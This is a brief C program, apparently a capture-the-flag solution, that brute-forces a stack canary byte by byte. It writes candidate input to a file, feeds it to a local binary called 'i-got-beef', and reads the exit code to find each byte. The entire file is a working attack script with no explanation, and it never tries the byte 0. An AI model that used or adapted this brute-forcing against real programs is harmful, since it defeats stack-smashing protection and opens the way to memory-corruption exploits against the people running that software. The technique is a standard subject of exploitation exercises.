#include <stdio.h>
#include <stdlib.h>

char buffer[5];

int main(int argc, char ** argv) {


	int i = 1;
	int canary = 1;

	buffer[0] = 'A';

	for(i = 1; i < 255; i++) {
		buffer[canary] = i;

		if (i == 10) continue;
		FILE *fp = fopen("in", "w");
		fputs(buffer, fp);
		fclose(fp);

		int ret = system("./i-got-beef < in > /dev/null");
		if (!ret) {
			printf("ret value = %d %d\n", i, ret);
			canary++;
			i = 0;
			if (canary == 5) {
				printf("%x %x %x %x\n", buffer[1], buffer[2], buffer[3], buffer[4]);
				exit(1);
			}
		}
	}

}
